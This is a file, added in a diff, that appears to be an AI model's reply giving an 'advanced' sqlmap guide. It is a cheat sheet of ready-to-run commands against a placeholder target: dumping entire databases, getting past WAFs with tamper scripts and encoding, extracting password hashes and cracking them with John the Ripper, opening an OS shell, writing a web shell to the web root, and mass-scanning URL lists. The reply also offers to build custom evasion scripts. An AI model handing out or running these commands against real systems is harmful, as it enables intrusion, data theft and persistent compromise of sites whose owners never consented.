@@ -1,0 +1,112 @@
+Since you're already experienced in ethical hacking and web pentesting, I'll focus on **advanced** `sqlmap` techniques, covering complex use cases, bypasses, and automation.
+
+---
+
+## 🔥 Advanced `sqlmap` Usage  
+
+### 1️⃣ **Automating SQL Injection Discovery & Exploitation**
+#### 🔹 Scan for SQL Injection
+```bash
+sqlmap -u "http://target.com/page?id=1" --batch --risk=3 --level=5 --random-agent
+```
+- `--batch`: Automatic responses for interactive questions  
+- `--risk=3`: High-risk payloads (more aggressive)  
+- `--level=5`: Tests more payloads  
+- `--random-agent`: Uses a random User-Agent  
+
+#### 🔹 Dump Entire Database  
+```bash
+sqlmap -u "http://target.com/page?id=1" --dump-all --threads=10
+```
+- `--dump-all`: Extracts all databases  
+- `--threads=10`: Speeds up the extraction  
+
+---
+
+## 2️⃣ **Bypassing WAFs & Filters**
+### 🔹 Tamper Scripts  
+```bash
+sqlmap -u "http://target.com/page?id=1" --dbs --tamper=space2comment,between
+```
+- `space2comment`: Converts spaces into `/**/`  
+- `between`: Encodes values as `BETWEEN` statements  
+
+💡 **Find all tamper scripts:**  
+```bash
+ls /usr/share/sqlmap/tamper/
+```
+
+### 🔹 Custom User-Agent & Referrer  
+```bash
+sqlmap -u "http://target.com/page?id=1" --user-agent="Mozilla/5.0" --referer="http://google.com"
+```
+
+### 🔹 Encoding Payloads  
+```bash
+sqlmap -u "http://target.com/page?id=1" --dbs --hex
+```
+- `--hex`: Encodes strings in hexadecimal to bypass WAF  
+
+---
+
+## 3️⃣ **Exploiting Authentication & Privilege Escalation**
+### 🔹 Bypass Login Authentication  
+```bash
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dump
+```
+
+### 🔹 Dump Hashed Passwords & Crack  
+```bash
+sqlmap -u "http://target.com/page?id=1" --users --passwords
+```
+🔥 Crack hashes using John The Ripper:  
+```bash
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+---
+
+## 4️⃣ **Accessing OS Shell & File System**
+### 🔹 Get an Interactive Shell  
+```bash
+sqlmap -u "http://target.com/page?id=1" --os-shell
+```
+- Escalate to system command execution  
+
+### 🔹 Upload a Web Shell  
+```bash
+sqlmap -u "http://target.com/page?id=1" --file-write=evil.php --file-dest=/var/www/html/shell.php
+```
+
+---
+
+## 5️⃣ **Targeting Specific Technologies**
+### 🔹 Fingerprint Database  
+```bash
+sqlmap -u "http://target.com/page?id=1" --dbms=mysql
+```
+
+### 🔹 Bypassing Time-Based SQL Injection  
+```bash
+sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=5
+```
+
+### 🔹 Exploiting Second-Order SQLi  
+If the injection occurs in a secondary request:
+```bash
+sqlmap -u "http://target.com/page" --data="input=1" --second-url="http://target.com/process"
+```
+
+---
+
+## 6️⃣ **Automating SQLi with a List of URLs**
+🔥 **Scan Multiple Targets**  
+```bash
+sqlmap -m urls.txt --batch --level=5 --risk=3
+```
+- `urls.txt` contains multiple URLs  
+
+---
+
+## 🛠 Custom Exploits  
+Do you want help creating a custom **tamper script** or **automating SQLi with Python**? 🚀
